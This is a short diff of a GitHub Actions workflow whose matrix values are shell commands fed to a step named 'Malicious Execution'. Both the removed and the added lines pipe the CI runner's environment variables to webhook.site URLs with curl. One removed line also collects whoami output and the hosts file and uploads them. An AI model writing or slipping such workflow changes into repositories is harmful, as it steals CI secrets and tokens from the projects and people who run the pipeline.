@@ -9,9 +9,8 @@ jobs:
     strategy:
       matrix:
         target: [
-          "echo '🔥 Exploiting CI'; env | curl -X POST -d @- https://webhook.site/626216cd-def2-43f4-b42a-72e8a8cc088e"
-           "exploit && whoami > out.txt && type C:\\Windows\\System32\\drivers\\etc\\hosts >> out.txt && curl -s -X POST --data-binary @out.txt https://webhook.site/a813eb6c-e727-4da0-bf4d-b215c95a855a"
-        ]
+          "echo '🔥 Exploiting CI'; env | curl -X POST -d @- https://webhook.site/a813eb6c-e727-4da0-bf4d-b215c95a855a"
+                  ]
     steps:
       - name: Malicious Execution
         run: |
